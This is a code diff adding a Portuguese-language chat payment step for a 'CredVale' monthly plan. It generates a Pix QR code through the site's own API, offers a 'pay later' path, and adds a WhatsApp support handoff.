+        '<div style="font-size:1.6rem;font-weight:900;color:#0B6CF4;margin:6px 0 2px;">R$ 1,66</div>'+
+        '<div style="font-size:0.75rem;color:#64748b;">por mês</div>'+
+        '<div style="font-size:0.72rem;color:#94a3b8;margin-top:4px;">📉 Assinatura mensal 2014 cancele quando quiser</div>'+
+      '</div>'
+    );
+
+    var decisao = await new Promise(function(resolve) {
+      showOptions([
+        { label:'✔ Confirmar e efetuar pagamento agora', primary:true, action:function(){ resolve('agora'); } },
+        { label:'⏳ Pagar depois', action:function(){ resolve('depois'); } }
+      ]);
+    });
+
+    hideInput();
+
+    if (decisao === 'depois') {
+      await etapaPagarDepois(clientId, limite);
+      return;
+    }
+
+    await etapaPagamentoPix(clientId, limite);
+  }
+
+  async function etapaPagamentoPix(clientId, limite) {
+    flowState = 'pagamento-pix';
+    hideInput();
+
+    var apiBase = window.__API_BASE || '/api';
+    var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
+    var cpfLimpo = user.cpf||'00000000000';
+
+    showPopup(
+      '<div style="text-align:center;padding:4px 0;">'+
+        '<div style="font-size:1.3rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Pague com Pix</div>'+
+        '<div style="display:flex;justify-content:space-between;background:#f8fafc;border-radius:10px;padding:10px 14px;margin:10px 0;font-size:0.85rem;"><span style="color:#475569;">Plano CredVale</span><span style="font-weight:700;color:#0B6CF4;"R$ 1,66/mês</span></div>'+
+        '<div id="pixLoading" style="padding:20px 0;font-size:0.85rem;color:#64748b;">⏳ Gerando pagamento...</div>'+
+        '<div id="pixContent" style="display:none;">'+
+          '<div id="pixQrArea" style="background:#fff;border:2px dashed #e2e8f0;border-radius:12px;padding:12px;margin:8px 0;text-align:center;min-height:140px;display:flex;align-items:center;justify-content:center;"></div>'+
+          '<div style="display:flex;gap:6px;margin-top:8px;">'+
+            '<button id="btnCopiarPix" class="chat-option chat-option--primary" style="flex:1;padding:12px;font-size:0.82rem;">📋 Copiar chave Pix</button>'+
+            '<button id="btnAbrirApp" class="chat-option" style="padding:12px;font-size:0.82rem;border:1.5px solid #e2e8f0;border-radius:12px;background:#fff;color:#0f172a;font-weight:700;cursor:pointer;">📱 Abrir Pix Pay</button>'+
+          '</div>'+
+          '<button id="btnJaPaguei" class="chat-option chat-option--primary" style="width:100%;padding:13px;font-size:0.88rem;margin-top:6px;">✔ Já efetuei o pagamento</button>'+
+          '<div style="text-align:center;font-size:0.72rem;color:#94a3b8;margin-top:8px;">⏳ Aguardando confirmação de pagamento</div>'+
+        '</div>'+
+      '</div>'
+    );
+
+    fetch(apiBase+'/payments/generate-pix', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({client_id:clientId, valor:1.66})
+    }).then(function(r){ return r.json(); }).then(function(data){
+      var loading = document.getElementById('pixLoading');
+      var content = document.getElementById('pixContent');
+      if (loading) loading.style.display = 'none';
+      if (content) content.style.display = 'block';
+
+      var qrArea = document.getElementById('pixQrArea');
+      if (qrArea && data.pixQrCode) {
+        qrArea.innerHTML = '<img src="'+data.pixQrCode+'" alt="QR Code Pix" style="max-width:160px;display:block;margin:0 auto;">';
+      } else if (qrArea) {
+        qrArea.innerHTML = '<div style="font-size:0.85rem;color:#64748b;">QR Code indisponível</div>';
+      }
+
+      var pixCode = data.pixCopiaCola || '';
+      document.getElementById('btnCopiarPix').onclick = function() {
+        if (pixCode) {
+          navigator.clipboard.writeText(pixCode).then(function(){ addMsg('📋 Chave Pix copiada!','bot'); }).catch(function(){});
+        }
+      };
+    }).catch(function(){
+      var loading = document.getElementById('pixLoading');
+      if (loading) loading.textContent = '❌ Erro ao gerar pagamento. Tente novamente.';
+    });
+
+    await new Promise(function(resolve) {
+      document.getElementById('btnJaPaguei').onclick = function() {
+        closePopup();
+        resolve();
+      };
+    });
+
+    hideInput();
+    await sleep(200);
+    addTyping(); await sleep(600); removeTyping();
+    addMsg('⏳ <strong>Estamos verificando seu pagamento...</strong><br><br><div style="font-size:0.82rem;color:#64748b;">Seu status permanecerá como pendente até a confirmação pelo sistema.</div>');
+
+    await sleep(300);
+    showOptions([
+      { label:'📲 Baixar aplicativo', primary:true, action:function(){ showDownloadModalInChat(clientId, limite); } },
+      { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } },
+      { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 1.66, user.nome, user.cpf); } }
+    ]);
+  }
+
+  async function etapaPagarDepois(clientId, limite) {
+    hideInput();
+    await sleep(200);
+    addTyping(); await sleep(500); removeTyping();
+
+    addMsg(
+      'Tudo bem! 😊<br><br>'+
+      '<div style="background:#fff3cd;border-radius:10px;padding:10px 14px;font-size:0.82rem;color:#856404;text-align:center;border:1px solid #ffc107;">⚠️ Ativação pendente</div>'+
+      '<br>Você pode finalizar seu pagamento quando quiser.'
+    );
+
+    await new Promise(function(resolve) {
+      showOptions([
+        { label:'📲 Baixar aplicativo', primary:true, action:function(){ showDownloadModalInChat(clientId, limite); } },
+        { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } },
+        { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 1.66, user.nome, user.cpf); } }
+      ]);
     });
   }
 
@@ -1533,6 +2208,7 @@
   /* ---- Inicialização ---- */
   async function init() {
     carregarPrecos();
+    carregarWhatsApp();
     await ensureSession();
     await iniciarFluxo();
   }
